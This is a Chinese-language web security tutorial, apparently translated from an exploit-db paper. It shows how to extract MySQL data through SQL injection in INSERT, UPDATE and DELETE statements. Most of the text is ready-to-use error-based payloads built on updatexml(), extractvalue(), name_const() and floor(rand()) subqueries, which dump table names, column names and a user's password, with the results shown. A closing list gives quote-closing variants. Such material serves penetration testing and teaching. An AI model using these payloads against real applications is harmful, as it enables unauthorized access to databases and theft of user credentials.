# 利用insert，update和delete注入获取数据

0x00 简介
-------

* * *

利用SQL注入获取数据库数据，利用的方法可以大致分为联合查询、报错、布尔盲注以及延时注入，通常这些方法都是基于select查询语句中的SQL注射点来实现的。那么，当我们发现了一个基于insert、update、delete语句的注射点时（比如有的网站会记录用户浏览记录，包括referer、client_ip、user-agent等，还有类似于用户注册、密码修改、信息删除等功能），还可以用如上方法获取我们需要的数据吗？在这里，我们以MYSQL的显错为例，看一下如何在insert、update、delete的注射点中获取我们想要的数据。

0x01 环境搭建
---------

* * *

为了更好的演示注射效果，我们先利用下面的语句创建原始数据：

```
create database newdb；
use newdb;
create table users(
id int(3) not null auto_increment,
username varchar(20) not null,
password varchar(20)  not null,
primary key (id)
);
insert into users values(1,'Jane','Eyre');

```

![enter image description here](http://drops.javaweb.org/uploads/images/4d92d1c58771151420b2414546cbe811c16c6223.jpg)

看一下当前数据结构：

![enter image description here](http://drops.javaweb.org/uploads/images/3b4c4e49adb7ab88a2fd5f0e73218de437ebf269.jpg)

0x02 注入语法
---------

* * *

因为我们这里是用的显错模式，所以思路就是在insert、update、delete语句中人为构造语法错误，利用如下语句：

```
insert into users (id, username, password) values (2,''inject here'','Olivia');
insert into users (id, username, password) values (2,""inject here"",'Olivia');

```

![enter image description here](http://drops.javaweb.org/uploads/images/c6ec7a392ca44ba5726e41f62afcb5bea416ae0e.jpg)

注意：大家看到本来是要填入username字段的地方，我们填了'inject here'和”inject here”两个字段来实现爆错，一个是单引号包含、一个是双引号包含，要根据实际的注入点灵活构造。

0x03 利用updatexml()获取数据
----------------------

* * *

updatexml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数。

payload：

```
or updatexml(1,concat(0x7e,(version())),0) or

```

Insert：

```
INSERT INTO users (id, username, password) VALUES (2,'Olivia' or updatexml(1,concat(0x7e,(version())),0) or'', 'Nervo');

```

![enter image description here](http://drops.javaweb.org/uploads/images/c0edc5332c85c0d3fd91843302954bd3d22982df.jpg)

Update：

```
UPDATE users SET password='Nicky' or updatexml(2,concat(0x7e,(version())),0) or''WHERE id=2 and username='Olivia';

```

![enter image description here](http://drops.javaweb.org/uploads/images/f5e512205ac642654f22d223ae27333693b74e44.jpg)

Delete：

```
DELETE FROM users WHERE id=2 or updatexml(1,concat(0x7e,(version())),0) or'';

```

![enter image description here](http://drops.javaweb.org/uploads/images/b05ae00817f561a9315981c39b51d93a336d649b.jpg)

提取数据：

由于篇幅有限，在insert、update、delete用法一致的时候，我会仅以insert为例说明。

所用的payload为：

```
or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or

```

获取newdb数据库表名：

![enter image description here](http://drops.javaweb.org/uploads/images/b614fe6cb1868df9b6dd8a603b90a0837111e6ac.jpg)

获取users表的列名：

![enter image description here](http://drops.javaweb.org/uploads/images/7662554cd3328bc6761a4d4a84f9aeaca824d664.jpg)

利用insert获取users表的数据：

![enter image description here](http://drops.javaweb.org/uploads/images/507f853e59767ab37ade278aa3faa35286c842b9.jpg)

利用delete获取users表的数据：

![enter image description here](http://drops.javaweb.org/uploads/images/1710e2b483b55da4e88fa58ed55492de6ab0e961.jpg)

我们可以用insert、update、delete语句获取到数据库表名、列名，但是不能用update获取当前表的数据：

![enter image description here](http://drops.javaweb.org/uploads/images/a04b1cdaeb868466f327b0a6151488008e060169.jpg)

在这里，为了演示用update获取数据，我们临时再创建一个含有id，name，address的students表，并插入一条数据：

![enter image description here](http://drops.javaweb.org/uploads/images/a81cc71013beb284c4775b180738ced8c53bc811.jpg)

再次利用update获取users表的数据：

![enter image description here](http://drops.javaweb.org/uploads/images/609c41d4ad2884165cf63c69053d05e46b73e8cf.jpg)

如果你碰到一个update的注入并且想获取当前表的数据的话，可用用双查询，我后面会讲到。

0x04 利用extractvalue()获取数据
-------------------------

* * *

extractvalue()函数也是MYSQL对XML文档数据进行查询和修改的XPATH函数。

payload：

```
or extractvalue(1,concat(0x7e,database())) or

```

Insert：

```
INSERT INTO users (id, username, password) VALUES (2,'Olivia' or extractvalue(1,concat(0x7e,database())) or'', 'Nervo');

```

![enter image description here](http://drops.javaweb.org/uploads/images/5558438e9d8c67e742e0948ea3619a4cdf2e9e02.jpg)

update：

```
UPDATE users SET password='Nicky' or extractvalue(1,concat(0x7e,database())) or'' WHERE id=2 and username='Nervo';

```

![enter image description here](http://drops.javaweb.org/uploads/images/39de1205bd5fe074c52efb88fe820cc715e21ead.jpg)

delete：

```
DELETE FROM users WHERE id=1 or extractvalue(1,concat(0x7e,database())) or'';

```

![enter image description here](http://drops.javaweb.org/uploads/images/af1b745f6c552ce7277d891ce23deaa91a1b9d29.jpg)

提取数据：

同样，在insert、update、delete用法一致的时候，我会仅以insert为例说明。

获取newdb数据库表名：

```
INSERT INTO users (id, username, password) VALUES (2,'Olivia' or extractvalue(1,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 1,1))) or'', 'Nervo');

```

![enter image description here](http://drops.javaweb.org/uploads/images/ac09c381fc3562aeeb336affebcef386387be323.jpg)

获取users表的列名：

```
INSERT INTO users (id, username, password) VALUES (2,'Olivia' or extractvalue(1,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name='users' limit 0,1))) or'', 'Nervo');

```

![enter image description here](http://drops.javaweb.org/uploads/images/332205c9cc82957fc6125c6fd6cc6d2e3b4ba64f.jpg)

获取users表的数据：

```
INSERT INTO users (id, username, password) VALUES (2,'Olivia' or extractvalue(1,concat(0x7e,(SELECT concat_ws(':',id, username, password) FROM users limit 0,1))) or '', 'Nervo');

```

![enter image description here](http://drops.javaweb.org/uploads/images/58526de0290e3e1b0a9ac86873196c72b5e2741e.jpg)

同样，我们可以用insert、update、delete语句获取到数据库表名、列名，但是不能用update获取当前表的数据。

0x05 利用name_const()获取数据
-----------------------

* * *

name_const()函数是MYSQL5.0.12版本加入的一个返回给定值的函数。当用来产生一个结果集合列时 , NAME_CONST() 促使该列使用给定名称。

Payload：

```
or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or

```

Insert：

```
INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or '','Nervo');

```

update：

```
UPDATE users SET password='Nicky' or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or '' WHERE id=2 and username='Nervo';

```

delete：

```
DELETE FROM users WHERE id=1 or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a)or '';

```

提取数据：

在最新的MYSQL版本中，使用name_const()函数只能提取到数据库的版本信息。但是在一些比较旧的高于5.0.12(包括5.0.12)的MYSQL版本中，可以进一步提取更多数据。在这里我使用MySQL5.0.45进行演示。

首先，我们做一个简单的SELECT查询，检查我们是否可以提取数据。

```
INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT*FROM(SELECT name_const((SELECT 2),1),name_const((SELECT 2),1))a) or '', 'Nervo');

```

如果显示ERROR 1210 (HY000): Incorrect arguments to NAME_CONST，那就洗洗睡吧。。

如果显示ERROR 1060 (42S21): Duplicate column name '2'，就可以进一步获取更多数据。

![enter image description here](http://drops.javaweb.org/uploads/images/bd1ed9449977394988c8cdbcc5af100ba337670b.jpg)

获取newdb数据库表名：

```
INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT*FROM(SELECT name_const((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 1,1),1),name_const(( SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 1,1),1))a) or '', 'Nervo');

ERROR 1060 (42S21): Duplicate column name 'users'

```

获取users表的列名：

```
INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT*FROM(SELECT name_const((SELECT column_name FROM information_schema.columns WHERE table_name='users' limit 0,1),1),name_const(( SELECT column_name FROM information_schema.columns WHERE table_name='users' limit 0,1),1))a) or '', 'Nervo');

ERROR 1060 (42S21): Duplicate column name 'id'

```

获取users表的数据：

```
INSERT INTO users (id, username, password) VALUES (2,'Olivia' or (SELECT*FROM(SELECT name_const((SELECT concat_ws(0x7e,id, username, password) FROM users limit 0,1),1),name_const(( SELECT concat_ws(0x7e,id, username, password) FROM users limit
0,1),1))a) or '', 'Nervo');

ERROR 1060 (42S21): Duplicate column name '1~Jane~Eyre'

```

0x06 利用子查询注入
------------

* * *

原理与select查询时的显错注入一致。

Insert：

```
INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or'', 'Nervo');

```

![enter image description here](http://drops.javaweb.org/uploads/images/b03d78b661663739992332a6f2844ac1cc6d89a7.jpg)

update：

```
UPDATE users SET password='Nicky' or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)or'' WHERE id=2 and username='Nervo';

```

![enter image description here](http://drops.javaweb.org/uploads/images/b2cdcfdf1473abb6c1871d20e0da6e97792596d3.jpg)

delete：

```
DELETE FROM users WHERE id=1 or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)or'' ;

```

![enter image description here](http://drops.javaweb.org/uploads/images/aba39924d840cec54de48bfc33f01147caf99076.jpg)

提取数据：

获取newdb数据库表名：

```
INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT distinct concat(0x7e,0x27,cast(table_name as char),0x27,0x7e) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '','Nervo');

```

![enter image description here](http://drops.javaweb.org/uploads/images/700479bcd0168818192a05ba427bd0ae67d93df7.jpg)

获取users表的列名：

```
INSERT INTO users (id, username, password) VALUES (1, 'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT distinct concat(0x7e,0x27,cast(column_name as char),0x27,0x7e) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '', 'Nervo');

```

![enter image description here](http://drops.javaweb.org/uploads/images/d335f9b1c2b38c28a003ab29aa065de5d47f6a7c.jpg)

获取users表的数据：

```
INSERT INTO users (id, username, password) VALUES (1, 'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT concat(0x7e,0x27,cast(users.username as char),0x27,0x7e) FROM `newdb`.users LIMIT 0,1) ) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '', 'Nervo');

```

![enter image description here](http://drops.javaweb.org/uploads/images/69b3a471c1f020005cff5c8a16a3902a144428cd.jpg)

0x07 更多闭合变种
-----------

* * *

```
' or (payload) or '
' and (payload) and '
' or (payload) and '
' or (payload) and '='
'* (payload) *'
' or (payload) and '
" – (payload) – "

```

0x08 引用
-------

* * *

http://dev.mysql.com/

http://websec.ca/kb/sql_injection

from：http://www.exploit-db.com/wp-content/themes/exploit/docs/33253.pdf